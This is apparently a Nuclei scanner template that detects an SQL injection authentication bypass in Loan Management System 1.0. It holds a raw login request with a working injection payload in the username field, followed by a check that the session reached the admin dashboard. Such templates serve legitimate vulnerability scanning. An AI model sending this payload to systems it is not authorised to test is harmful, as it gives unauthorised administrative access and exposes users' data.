id: loancms-sqli
info:
  name: Loan Management System 1.0 - SQL Injection
  author: arafatansari
  severity: critical
  description: Loan Management System 1.0 is vulnerable to SQL injection through the
    username parameter, allowing attackers to access sensitive information, modify
    data, and perform unauthorized administrative actions on the affected site.
  reference:
  - https://www.exploit-db.com/exploits/50402
  - https://packetstormsecurity.com/files/167860/Loan-Management-System-1.0-SQL-Injection.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  metadata:
    verified: true
    impact: The SQL injection vulnerability in Loan Management System 1.0 may lead
      to unauthorized access to sensitive data, tampering of information and execution
      of unauthorized administrative operations.
    recommendation: It is recommended that Loan Management System 1.0 be immediately
      updated to address the SQL injection vulnerability in order to protect sensitive
      data and prevent unauthorized access.
  tags: auth-bypass,cms,packetstorm,edb,loancms,sqli
requests:
- raw:
  - 'POST /ajax.php?action=login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username=admin''+or+''1''%3D''1''%23&password=nuclei

    '
  - 'GET /index.php?page=home HTTP/1.1

    Host: {{Hostname}}

    '
  cookie-reuse: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - window.start_load
    - Welcome back Admin
    - Loan Management System
    condition: and
  - type: word
    part: body
    words:
    - login-form
    negative: true
